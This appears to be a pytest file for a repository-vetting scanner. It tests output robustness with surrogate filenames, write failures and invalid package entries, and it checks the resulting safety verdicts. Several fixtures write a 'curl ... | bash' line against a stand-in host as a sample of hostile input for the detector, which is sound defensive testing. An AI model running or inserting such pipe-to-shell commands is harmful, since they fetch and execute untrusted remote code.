import json
from pathlib import Path

import pytest

from scanner.vet import __main__ as vm
from scanner.vet import osv as osvmod
from scanner.vet import sandbox as sb
from scanner.vet import signals as sg
from scanner.vet.verdict import Verdict, decide

ROOT = Path(__file__).resolve().parent.parent


def _tree_with_surrogate_name(tmp_path, monkeypatch):
    (tmp_path / "install.sh").write_text("curl -fsSL https://example.invalid/i.sh | bash\n")
    orig = sg._scan_file

    def patched(sc, root, full, rel, mb):  # tên file không phải UTF-8 -> os.walk trả surrogate (Linux)
        return orig(sc, root, full, "\udcff" + rel, mb)
    monkeypatch.setattr(sg, "_scan_file", patched)


def test_surrogate_filename_keeps_high_signal_and_vet_json_is_valid(tmp_path, monkeypatch):
    repo = tmp_path / "repo"
    repo.mkdir()
    _tree_with_surrogate_name(repo, monkeypatch)
    out = tmp_path / "vet.json"
    vm.main([str(repo), "--out", str(out)])
    text = out.read_text(encoding="utf-8")
    assert text
    res = sb.parse_result(text)
    assert res is not None and any(s.level == "high" for s in res.signals)
    assert decide(res, None, False, []) == Verdict.NOT_SAFE


def test_surrogate_in_lockfile_package_name_does_not_break_output(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "package-lock.json").write_text(json.dumps({"dependencies": {"a\ud800b": {"version": "1.0.0"}}}),
                                            encoding="utf-8", errors="surrogatepass")
    (repo / "i.sh").write_text("curl -fsSL https://example.invalid/i.sh | bash\n")
    out = tmp_path / "vet.json"
    vm.main([str(repo), "--out", str(out)])
    res = sb.parse_result(out.read_text(encoding="utf-8"))
    assert res is not None and any(s.level == "high" for s in res.signals)


def test_write_failure_still_writes_valid_fallback(tmp_path, monkeypatch):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "i.sh").write_text("curl -fsSL https://example.invalid/i.sh | bash\n")
    real = json.dumps
    calls = {"n": 0}

    def boom(obj, *a, **k):
        calls["n"] += 1
        if calls["n"] == 1:
            raise UnicodeEncodeError("utf-8", "x", 0, 1, "forced")
        return real(obj, *a, **k)
    monkeypatch.setattr(vm.json, "dumps", boom)
    out = tmp_path / "vet.json"
    code = vm.main([str(repo), "--out", str(out)])
    res = sb.parse_result(out.read_text(encoding="utf-8"))
    assert res is not None and res.incomplete and code != 0
    assert any("lỗi ghi kết quả" in i for i in res.incomplete)
    assert decide(res, None, False, []) != Verdict.SAFER


def test_valid_packages_counts_dropped():
    pk, dropped = osvmod.valid_packages_counted([["npm", "a", "1.0.0"], [1, 2, 3], ["npm", "b", "!!bad"]])
    assert pk == [("npm", "a", "1.0.0")] and dropped == 2
    assert osvmod.valid_packages_counted([["npm", "a", "1.0.0"], ["npm", "a", "1.0.0"]])[1] == 0


def _vet(packages):
    from tests.test_vet_sandbox import FakeExec, run
    ex = FakeExec(outputs={"packages": json.dumps(packages)})
    http = lambda u, b: json.dumps({"results": [{} for _ in json.loads(b)["queries"]]}).encode()  # noqa: E731
    return run(ex, http=http)


def test_dropped_packages_prevent_safer():
    out = _vet([["npm", "a", "1.0.0"], [1, 2, 3]])
    assert out.verdict == Verdict.SUSPICIOUS
    assert any("Bỏ qua 1 gói không hợp lệ" in e for e in out.tool_errors)


def test_bad_version_prevents_safer():
    assert _vet([["npm", "a", "1.0.0"], ["npm", "b", "x y"]]).verdict == Verdict.SUSPICIOUS


def test_fully_valid_packages_still_safer():
    out = _vet([["npm", "a", "1.0.0"]])
    assert out.verdict == Verdict.SAFER and not out.tool_errors


def test_no_bom_in_py_and_cmd_files():
    bad = []
    for pat in ("*.py", "*.cmd"):
        for p in ROOT.rglob(pat):
            if any(x in p.parts for x in (".venv", "node_modules", ".git", "__pycache__")):
                continue
            if p.read_bytes()[:3] == b"\xef\xbb\xbf":
                bad.append(str(p.relative_to(ROOT)))
    assert bad == []
